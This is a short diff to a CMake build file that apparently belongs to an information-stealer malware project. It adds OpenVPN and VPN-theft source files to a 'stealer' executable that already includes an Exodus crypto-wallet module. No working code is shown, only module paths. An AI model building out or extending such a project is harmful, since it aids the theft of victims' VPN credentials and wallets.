@@ -46,6 +46,10 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/crypto/Crypto.h
         src/stealer/impl/crypto/impl/Exodus.cpp
         src/stealer/impl/crypto/impl/Exodus.h
+        src/stealer/impl/vpns/VPNs.cpp
+        src/stealer/impl/vpns/VPNs.h
+        src/stealer/impl/vpns/impl/OpenVPN.cpp
+        src/stealer/impl/vpns/impl/OpenVPN.h
 )
 
 target_link_libraries(stealer
